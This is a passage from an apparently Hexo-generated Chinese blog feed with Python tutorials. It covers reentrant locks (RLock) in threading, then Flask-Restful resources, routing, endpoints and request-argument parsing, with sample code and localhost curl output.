多少次,只有最后一次释放锁才会改变锁的状态为<code>Unlocked</code>.</li></ul><p>总结:</p><p><code>RLock</code>内部维护着一个<code>Lock</code>和一个<code>counter</code>变量,<code>counter</code>记录了<code>acquire</code>的次数,从而使得资源可以被多次<code>acquire</code>.直到一个线程所有的<code>acquire</code>都被<code>release</code>，其他的线程才能获得资源.即对于同一线程而言,是可重入锁,而对于其他线程而言,和上面的Lock没有区别.</p><p>上面的例子使用<code>Rlock</code> 来替代,就不会发生死锁</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> timenum <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true"># 创建锁定池,RLock 可以重复的上锁</span>mutex <span class="token operator">=</span> threading<span class="token punctuation">.</span>RLock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     super<span class="token punctuation">(</span>MyThread<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> num     time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 获取锁</span>     <span class="token keyword">if</span> mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 设置了超时时间</span>         num <span class="token operator">+=</span> <span class="token number">1</span>         msg <span class="token operator">=</span> <span class="token string">"{} set num to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> num<span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>         mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 单一线程重复获取锁,锁没有释放,变成死锁</span>         mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>         mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span><span class="token punctuation">)</span>     t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">Thread-1 <span class="token keyword">set</span> num to 1Thread-4 <span class="token keyword">set</span> num to 2Thread-2 <span class="token keyword">set</span> num to 3Thread-3 <span class="token keyword">set</span> num to 4Thread-5 <span class="token keyword">set</span> num to 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h3><blockquote><p>构造一个<code>Box</code> 类,有<code>add()</code>和<code>remove()</code>方法,提供了进入<code>execute()</code> 方法的入口,<code>execute()</code> 的执行由<code>RLock()</code> 来控制.这样每个函数的内部都实现了加锁和释放锁的操作,虽然获取多次锁,但是只有当一个线程完全释放了锁之后,另外一个线程才会去获取锁.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token keyword">class</span> <span class="token class-name">Box</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj_lock<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>total_items <span class="token operator">=</span> <span class="token number">0</span>  self<span class="token punctuation">.</span>lock <span class="token operator">=</span> obj_lock<span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  self<span class="token punctuation">.</span>total_items <span class="token operator">+=</span> n  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  self<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  self<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  self<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 两个方法</span><span class="token keyword">def</span> <span class="token function">adder</span><span class="token punctuation">(</span>box<span class="token punctuation">,</span> items<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> items<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'adding 1 item in the box'</span><span class="token punctuation">)</span>  box<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  items <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">remover</span><span class="token punctuation">(</span>box<span class="token punctuation">,</span> items<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> items<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'remove 1 item in the box'</span><span class="token punctuation">)</span>  box<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  items <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>items <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'putting {} items in the box'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">)</span>lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>RLock<span class="token punctuation">(</span><span class="token punctuation">)</span>box <span class="token operator">=</span> Box<span class="token punctuation">(</span>lock<span class="token punctuation">)</span>t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>adder<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>box<span class="token punctuation">,</span> items<span class="token punctuation">)</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>remover<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>box<span class="token punctuation">,</span> items<span class="token punctuation">)</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{} itesms still remain in the box'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>box<span class="token punctuation">.</span>total_items<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">putting 5 items <span class="token keyword">in</span> the boxadding 1 item <span class="token keyword">in</span> the boxremove 1 item <span class="token keyword">in</span> the boxremove 1 item <span class="token keyword">in</span> the boxadding 1 item <span class="token keyword">in</span> the boxremove 1 item <span class="token keyword">in</span> the boxadding 1 item <span class="token keyword">in</span> the boxremove 1 item <span class="token keyword">in</span> the boxadding 1 item <span class="token keyword">in</span> the boxremove 1 item <span class="token keyword">in</span> the boxadding 1 item <span class="token keyword">in</span> the box0 itesms still remain <span class="token keyword">in</span> the box<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FlaskRestful</title>
      <link href="/posts/7438.html"/>
      <url>/posts/7438.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-5/1604576436084-10328.png"></p><h2 id="Flask-Restful"><a href="#Flask-Restful" class="headerlink" title="Flask Restful"></a><code>Flask Restful</code></h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><blockquote><p>在<code>Flask</code> 中,为了写出更优雅的<code>API</code> ,提供了一个插件<code>FLask Restful</code> .</p><pre class="line-numbers language-bash">$ pip install flask_restful</code></pre><p><a href="https://flask-restful.readthedocs.io/en/latest/quickstart.html" target="_blank" rel="noopener">官网</a></p></blockquote><h3 id="2-基本应用"><a href="#2-基本应用" class="headerlink" title="2.基本应用"></a>2.基本应用</h3><blockquote><p>一个简单的<code>API</code> 类似如下:</p><pre><code class="python"><code class="language-bash">$ pip install flask_restful</code></pre><p><a href="https://flask-restful.readthedocs.io/en/latest/quickstart.html" target="_blank" rel="noopener">官网</a></p></blockquote><h3 id="2-基本应用"><a href="#2-基本应用" class="headerlink" title="2.基本应用"></a>2.基本应用</h3><blockquote><p>一个简单的<code>API</code> 类似如下:</p><pre><code class="python">#!/usr/bin/env python# coding=utf-8from flask import Flaskfrom flask_restful import Resource,Apiapp = Flask(__name__)# 1.Api绑定appapi = Api(app)# 定义一个GET/Post方法class HelloWorld(Resource): def get(self):     return {'hello':'world'}# 注册URL 资源api.add_resource(HelloWorld,'/api/hello/')@app.route('/')def hello_world(): return 'Hello World!'if __name__ == '__main__': app.run(debug=True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试联通性:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ curl http://127.0.0.1:5000/api/hello/{ "hello": "world"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-Resource-routing-资源路由"><a href="#3-Resource-routing-资源路由" class="headerlink" title="3.Resource routing 资源路由"></a>3.<code>Resource routing</code> 资源路由</h3><blockquote><p><code>Flask_Restful</code>提供的最主要的基础就是资源<code>Resource</code> 类.它是构建在<code>Flask可拔插视图</code> 之上的,利用它可以很容易的访问多个<code>HTTP</code> 方法.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Resource<span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Resource</span><span class="token punctuation">(</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># Resource继承自MethodView,这意味者它可以重写 get/post等方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Resource<span class="token punctuation">,</span>Apiapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1. Api初始化app</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>app<span class="token punctuation">)</span>todos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 2.重写 Get/Post方法</span><span class="token keyword">class</span> <span class="token class-name">TodoSimple</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>todo_id<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">'''重写 get 方法'''</span>     <span class="token keyword">return</span> <span class="token punctuation">{</span>todo_id<span class="token punctuation">:</span>todos<span class="token punctuation">[</span>todo_id<span class="token punctuation">]</span><span class="token punctuation">}</span> <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>todo_id<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">'''重写 post 方法'''</span>     todos<span class="token punctuation">[</span>todo_id<span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token punctuation">{</span>todo_id<span class="token punctuation">:</span>todos<span class="token punctuation">[</span>todo_id<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 3.注册资源</span><span class="token comment" spellcheck="true"># 访问URL的变量部分,可以使用 &lt;converter:variable_name></span><span class="token comment" spellcheck="true"># 此部分可以写成</span><span class="token comment" spellcheck="true"># api.add_resource(TodoSimple,'/api/todos/&lt;todo_id>')</span>api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>TodoSimple<span class="token punctuation">,</span><span class="token string">'/api/todos/&lt;string:todo_id>'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问:</p><pre class="line-numbers language-bash"><code class="language-bash">❯ curl http://127.0.0.1:5000/api/todos/todo1 -d <span class="token string">"data=test"</span> -X POST<span class="token punctuation">{</span> <span class="token string">"todo1"</span><span class="token keyword">:</span> <span class="token string">"test"</span><span class="token punctuation">}</span>❯ curl http://127.0.0.1:5000/api/todos/todo1<span class="token punctuation">{</span> <span class="token string">"todo1"</span><span class="token keyword">:</span> <span class="token string">"test"</span><span class="token punctuation">}</span>❯ curl http://127.0.0.1:5000/api/todos/todo2 -d <span class="token string">"data=test2"</span> -X POST<span class="token punctuation">{</span> <span class="token string">"todo2"</span><span class="token keyword">:</span> <span class="token string">"test2"</span><span class="token punctuation">}</span>❯ curl http://127.0.0.1:5000/api/todos/todo2<span class="token punctuation">{</span> <span class="token string">"todo2"</span><span class="token keyword">:</span> <span class="token string">"test2"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>add_resource</code> ,可以添加<code>url</code> 中的变量参数,以及多个<code>url</code> .</p></blockquote><h3 id="4-endpoint"><a href="#4-endpoint" class="headerlink" title="4.endpoint"></a>4.<code>endpoint</code></h3><blockquote><p>可以在<code>API</code> 中指定多个<code>URL</code> ,他们指定在<code>Api.add_resource()</code> 方法中.每个<code>URL</code> 都能访问<code>Resource</code> .</p><pre class="line-numbers language-python"><code class="language-python">api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>HelloWorld<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'/hello'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 127.0.0.1:5000</span><span class="token comment" spellcheck="true"># 127.0.0.1:5000/hello 都可以访问到 HelloWold类中定义的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还可以为资源方法指定<code>endpoint</code></p><pre class="line-numbers language-python">api.add_resource(TodoSimple,&#39;/api/todos/&lt;string:todo_id&gt;&#39;,endpoint=&#39;todos&#39;)</code></pre><pre><code class="python"><code class="language-python">api.add_resource(TodoSimple,&#39;/api/todos/&lt;string:todo_id&gt;&#39;,endpoint=&#39;todos&#39;)</code></pre><pre><code class="python"># 1. Api初始化appapi = Api(app)todos = {}# 2.重写 Get/Post方法class TodoSimple(Resource): def get(self,todo_id=None):     '''重写 get 方法'''     return {todo_id:todos[todo_id]} def post(self,todo_id=None):     '''重写 post 方法'''     todos[todo_id] = request.form.get('data')     return {todo_id:todos[todo_id]}# 3.注册资源# 访问URL的变量部分,可以使用 <converter:variable_name># 此部分可以写成# api.add_resource(TodoSimple,'/api/todos/<todo_id>')api.add_resource(TodoSimple,'/api/todos/<string:todo_id>',endpoint='todos')with app.test_request_context(): print(url_for('todos',todo_id='test3'))if __name__ == '__main__': app.run(debug=True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>endpoint</code>是用来给<code>url_for</code>反转的时候指定的.如果不写<code>endpoint</code>,那么将会使用视图的名字的小写作为<code>endpoint</code>.</li></ul><p>以上如果不写<code>endpoint</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">with</span> app<span class="token punctuation">.</span>test_request_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'todosimple'</span><span class="token punctuation">,</span>todo_id<span class="token operator">=</span><span class="token string">'test3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="5-Argument-Parsing-参数解析"><a href="#5-Argument-Parsing-参数解析" class="headerlink" title="5.Argument Parsing 参数解析"></a>5.<code>Argument Parsing</code> 参数解析</h3><blockquote><p><code>Flask_Restful</code> 提供了简单的表单验证功能,类似与<code>WTForms</code> ,但是非常的简陋.它使用了一个<code>argparse</code> 库.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> reqparseparse <span class="token operator">=</span> reqparse<span class="token punctuation">.</span>RequestParser<span class="token punctuation">(</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'rate'</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'this is a test'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 返回一个字典对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>parse.add_argument()</code> 常用参数有</p><ul><li><code>default=&#39;value&#39;</code> :指定默认值,如果前端没有传递值,就使用默认值.</li><li><code>required=True</code> :要求前端必须传递值,默认为<code>False</code> .</li><li><code>type=str</code> :指定数据类型,要求前端必须传递规定的数据类型,可以使用<code>python</code> 字典的数据类型,也可以指定<code>flask_restful.inputs</code> 模块下的值,比如:<ul><li><code>falsk_restful.inputs.url</code>:验证<code>URL</code></li><li><code>falsk_restful.inputs.boolean</code>:验证布尔值,可以是<code>True/False</code> 或<code>0\1</code></li><li><code>falsk_restful.inputs.date</code> :验证日期格式是<code>YYYY-mm-dd</code></li><li><code>falsk_restful.inputs.reqex()</code>:验证正则表达式</li></ul></li><li><code>choices=[]</code> :指定一个列表,前端的值必须是列表中的值.</li><li><code>help=&#39;xxx</code>‘: 指定出错的一个帮助信息.</li><li><code>trim=True</code> : 指定去除前端返回值的空格.默认是<code>False</code>.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Api<span class="token punctuation">,</span>Resource<span class="token punctuation">,</span>reqparse<span class="token punctuation">,</span>inputsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1.Api绑定app</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.重载get/post 方法</span><span class="token keyword">class</span> <span class="token class-name">RegiseterView</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'login'</span><span class="token punctuation">:</span><span class="token string">'???'</span><span class="token punctuation">}</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''验证的输入'''</span>        parse <span class="token operator">=</span> reqparse<span class="token punctuation">.</span>RequestParser<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 去除前端返回值的空格</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>str<span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'用户名不正确'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>str<span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'密码不正确'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 使用type=int,使用默认值</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>int<span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'年龄必须是整数'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 使用inputs.date 数据类型</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'birthday'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>inputs<span class="token punctuation">.</span>date<span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'日期不正确'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 使用inputs.regex</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'phone'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>inputs<span class="token punctuation">.</span>regex<span class="token punctuation">(</span>r<span class="token string">'1[3789]\d{9}'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'手机号码不正确'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 使用inputs.boolean</span>        parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'gender'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>str<span class="token punctuation">,</span>choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'male'</span><span class="token punctuation">,</span><span class="token string">'female'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'性别不正确'</span><span class="token punctuation">,</span>trim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 打印</span>        args <span class="token operator">=</span> parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>        <span class="token keyword">return</span> args<span class="token comment" spellcheck="true"># 3.注册路由</span>api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>RegiseterView<span class="token punctuation">,</span><span class="token string">'/api/register/'</span><span class="token punctuation">,</span>endpoint<span class="token operator">=</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问并得到</p><pre class="line-numbers language-bash"><code class="language-bash">❯ curl http://127.0.0.1:5000/api/register/ -d <span class="token string">"username=Jack&amp;password=aaa&amp;age=19&amp;phone=18618609966&amp;gender=male"</span> -X POST<span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token keyword">:</span> <span class="token string">"Jack"</span>,    <span class="token string">"password"</span><span class="token keyword">:</span> <span class="token string">"aaa"</span>,    <span class="token string">"age"</span><span class="token keyword">:</span> 19,    <span class="token string">"birthday"</span><span class="token keyword">:</span> null,    <span class="token string">"phone"</span><span class="token keyword">:</span> <span class="token string">"18618609966"</span>,    <span class="token string">"gender"</span><span class="token keyword">:</span> <span class="token string">"male"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-格式化字段"><a href="#6-格式化字段" class="headerlink" 